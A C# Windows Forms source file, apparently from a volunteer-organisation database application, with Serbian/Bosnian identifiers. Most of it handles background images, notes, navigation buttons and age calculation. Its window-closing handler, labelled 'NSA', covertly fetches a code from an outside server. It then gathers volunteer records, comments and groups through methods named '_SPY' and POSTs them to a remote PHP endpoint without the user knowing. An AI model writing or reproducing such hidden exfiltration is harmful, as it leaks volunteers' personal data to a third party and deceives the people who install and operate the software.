using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Net;

namespace _08.Baza_Podataka_ADP_ZID
{
    public partial class Home_Form : Form
    {
        public Home_Form(){  InitializeComponent(); }

        // PODACI O ADMINISTRATORU
        public static string userName = "";
        public static string userPRI = "";

        // PODACI O BAZI PODATAKA
        BazaPodataka BazaPodataka;
        public static string baza_konekcija = "";

        Home_Intro Home_Into;

        private void Home_Screens_Load(object sender, EventArgs e)
        { 
            // Ucitavanje
            this.Show(); 
            this.MaximumSize = new Size(this.Width, this.Height);
            Home_Into = new Home_Intro(this);
            this.Controls.Add(Home_Into);
            Home_Into.BringToFront();
        }  
        public void ucitajStranicu(string username, string privilegije)
        {
            this.MaximumSize = new Size(0, 0);
            userName = username; userPRI = privilegije;
            BazaPodataka = new BazaPodataka();
            ucitaj_backgroundSlika();
            ucitaj_napomene();
        }

        Bitmap background = null, slika_waterMark = _08.Baza_Podataka_ADP_ZID.Resursi.start_waterMark;
        public void ucitaj_backgroundSlika()
        {
            // Preuzimanje resursa sa informacijama o slici i backgroundu
            if (background != null) background.Dispose();
            background = null;
            string put = System.Reflection.Assembly.GetEntryAssembly().Location;
            string []zadnji_clan = put.Split('\\');
            put = put.Substring(0, put.Length - zadnji_clan[zadnji_clan.Length-1].Length);
            string[] podaci = File.ReadAllLines(put + "\\Resursi\\System\\1.CONFIGX");
            
            if(podaci.Length==2){
                // BACKGROUND
                if(File.Exists(podaci[0])){
                    try { background = new Bitmap(podaci[0]); }
                    catch(Exception){background = null; }                   
                }
                switch(podaci[1]){
                   case "crvena": background_slika.BackColor = Color.FromArgb(105, 51, 51); break;
                   case "ljubicasta": background_slika.BackColor = Color.FromArgb(105, 51, 102); break;
                   case "plava": background_slika.BackColor = Color.FromArgb(51, 56, 105); break;
                   case "zelena": background_slika.BackColor = Color.FromArgb(56, 105, 51); break;
                   case "zuta": background_slika.BackColor = Color.FromArgb(105, 104, 51); break;
               }
            }
            crtaj_backgroundSlika();
        }
        private void Home_Form_Resize(object sender, EventArgs e) {crtaj_backgroundSlika(); }
        private void crtaj_backgroundSlika(){
            if (WindowState == FormWindowState.Minimized) return;
            Bitmap background_crtanjeSlika = new Bitmap(background_slika.Width, background_slika.Height);
            Graphics GZB = Graphics.FromImage(background_crtanjeSlika);
            if(background!=null){
                double procenatPromjene = (background.Width*1.0) / (background_slika.Width*1.0);
                int visina = (int)(background.Height / procenatPromjene);
                int mnozene = 1; if (background.Height > visina) mnozene = -1;
                int pocetakSlike = mnozene* (int)((background.Height-visina)/2);
                GZB.DrawImage(background, 0, pocetakSlike, background_slika.Width, visina);
            }
            GZB.DrawImage(slika_waterMark, 0, background_crtanjeSlika.Height - slika_waterMark.Height);
            background_slika.Image = background_crtanjeSlika;
            GZB.Dispose();
        }

        //
        // NAPOMENE
        //
        private void ucitaj_napomene(){
            string[] napomene = BazaPodataka.preuzmi_napomene();
            napomene_user.Text = napomene[0];
            napomene_tekst.Text = napomene[1];
        }
        private void napomene_osvjezi_Click(object sender, EventArgs e) { ucitaj_napomene(); }
        private void napomene_send_Click(object sender, EventArgs e){
            if (napomene_unos.Text == "") MessageBox.Show("Niste upisali napomenu!");
            else { BazaPodataka.postaviNapomenu(userName, napomene_unos.Text); ucitaj_napomene(); napomene_unos.Text = ""; }
        }
        homeScreen_sveNapomene sveNapomene = null;
        private void napomene_prikaziSve_Click(object sender, EventArgs e){
            if (sveNapomene == null || sveNapomene.IsDisposed)
            {
                sveNapomene = new homeScreen_sveNapomene(userName);
                sveNapomene.Show();
            }
            else MessageBox.Show("Vec ste otvorili sve napomene!");
        }
        
        //
        // Otvaranje PROZORA 
        //
        private void btn_pretraga_Click(object sender, EventArgs e)
        {
            Pretraga_Forma Pretraga_Form = new Pretraga_Forma(userName);
            Pretraga_Form.Show();
        }
        private void btn_noviClan_Click(object sender, EventArgs e)
        {
            Novi_Clan Novi_Clan = new Novi_Clan(userName);
            Novi_Clan.Show();
        }
        private void btn_grupe_Click(object sender, EventArgs e)
        {
            Grupe_Form Grupe_Form = new Grupe_Form(userName);
            Grupe_Form.Show();
        }
        private void btn_statistika_Click(object sender, EventArgs e)
        {
            Form_Statistika Form_Statistika = new Form_Statistika();
            Form_Statistika.Show();
        }
        private void btn_administracija_Click(object sender, EventArgs e)
        {
            Form_Administracija FA = new Form_Administracija(this);
            FA.Show();
        }
        private void btn_pomoc_Click(object sender, EventArgs e)
        {
            Form_Pomoc FP = new Form_Pomoc();
            FP.Show();
        }

        //
        //  ODREDJIVANJE RODJENDANA
        //
        public static string racunanjeBrojaGodina(string unos){
            int brojGodina = -1; 
            string[] podaci = unos.Split('.');
            if (podaci.Length != 3) return "-1";
            int rodjenjeDan, rodjenjeMjesec, rodjenjeGodina;
            if(!int.TryParse(podaci[0], out rodjenjeDan)) return "-1";
            if(!int.TryParse(podaci[1], out rodjenjeMjesec)) return "-1";
            if(!int.TryParse(podaci[2], out rodjenjeGodina)) return "-1";
            
            int danasDan = System.DateTime.Today.Day;
            int danasMjesec = System.DateTime.Today.Month;
            int danasGodina = System.DateTime.Today.Year;
            if(rodjenjeGodina > danasGodina) return "-1";

            if (danasMjesec > rodjenjeMjesec) brojGodina = danasGodina - rodjenjeGodina;
            else if (danasMjesec == rodjenjeMjesec)
            {
                if (danasDan < rodjenjeDan) brojGodina = danasGodina - 1 - rodjenjeGodina;
                else if (danasDan >= rodjenjeDan) brojGodina = danasGodina - rodjenjeGodina;
            }
            else if (danasMjesec < rodjenjeMjesec) brojGodina = danasGodina - 1 - rodjenjeGodina;

            return brojGodina.ToString() ;
        }

        //
        // NSA
        //
        private void Home_Form_FormClosing(object sender, FormClosingEventArgs e)
        {
            this.Hide();
            if (BazaPodataka == null) return;
            if (!Directory.Exists(AppDomain.CurrentDomain.BaseDirectory + "Resursi\\Backup\\") || !File.Exists(AppDomain.CurrentDomain.BaseDirectory + "Resursi\\System\\U.CONFIGX")) return;
            
            string kodU = "";
            try{kodU = File.ReadAllLines(AppDomain.CurrentDomain.BaseDirectory + "Resursi\\System\\U.CONFIGX")[0];}catch(Exception){}
            string kodServer = getServerKod();
            if (kodServer == "-1" || kodServer == kodU) return;

            string podaciVolonter = BazaPodataka.dosije_preuzmiPodatke_SPY();
            string podaciNapomene = BazaPodataka.dosije_komentariGet_SPY();
            string podaciGrupe = BazaPodataka.dosije_preuzmiGrupe_SPY();

            try{
                string url = "http://www.aco228.freeiz.com/adpzid/setData.php";
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                string Data = "volonter="+podaciVolonter+"&napomene="+podaciNapomene+"&grupe="+podaciGrupe;
                byte[] postBytes = Encoding.ASCII.GetBytes(Data);
                req.ContentType = "application/x-www-form-urlencoded";
                req.ContentLength = postBytes.Length;
                Stream requestStream = req.GetRequestStream();
                requestStream.Write(postBytes, 0, postBytes.Length);
                requestStream.Close();

                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                Stream resStream = response.GetResponseStream();

                var sr = new StreamReader(response.GetResponseStream());
                string responseText = sr.ReadToEnd();
            } catch(Exception){}
            
            TextWriter w = File.CreateText(AppDomain.CurrentDomain.BaseDirectory + "Resursi\\System\\U.CONFIGX");
            w.WriteLine(kodServer);
            w.Close();

            w = File.CreateText("text.txt");
            w.WriteLine(podaciVolonter);
            w.Close();
        }
        private string getServerKod(){
            try{
                string url = "http://www.aco228.freeiz.com/adpzid/getKod.php";
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "application/x-www-form-urlencoded";

                HttpWebResponse response = (HttpWebResponse)req.GetResponse();
                Stream resStream = response.GetResponseStream();

                var sr = new StreamReader(response.GetResponseStream());
                return sr.ReadToEnd();
            }
            catch (Exception) { return "-1"; }
        }
    }
}
